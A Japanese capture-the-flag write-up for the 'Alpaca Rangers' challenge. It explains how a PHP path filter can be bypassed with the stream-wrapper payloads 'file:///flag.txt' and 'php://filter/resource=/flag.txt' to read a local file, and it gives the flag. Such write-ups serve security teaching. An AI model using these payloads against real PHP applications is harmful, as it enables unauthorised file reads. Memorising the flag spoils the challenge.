# Alpaca Rangers

[English version](./README.md)

## 説明

正義のヒーロー、アルパカレンジャー！

## Writeup

### 概要

この問題の目標は、`/flag.txt` の内容を読むことです。

```php
if (str_starts_with($targetPath, '/') || str_starts_with($targetPath, '\\') || str_contains($targetPath, '..')) {
    $errorMessage = 'Invalid path.';
} else {
    $contents = @file_get_contents($targetPath);
    /* ... */
}
```

このコードは、次のような典型的なディレクトリトラバーサルをブロックしているように見えます。
* `../../../flag.txt`
* `/flag.txt`

では、このフィルタを回避できるでしょうか？

### 解法

[`file_get_contents`](https://www.php.net/manual/ja/function.file-get-contents.php) のドキュメントを読むと、通常のファイル名だけでなくプロトコルも利用できることが分かります。[このページ](https://www.php.net/manual/ja/wrappers.php)を見ると、`file://` プロトコルがサポートされています。したがって、次のペイロードはフィルタされず、ファイルを読み取れます。

```
file:///flag.txt
```

また、`php://` プロトコルを使う方法でもファイルを読み取れます。

```
php://filter/resource=/flag.txt
```

## フラグ

`Alpaca{Alpaca_gre3n_and_p1nk_com1ng_s0on}`
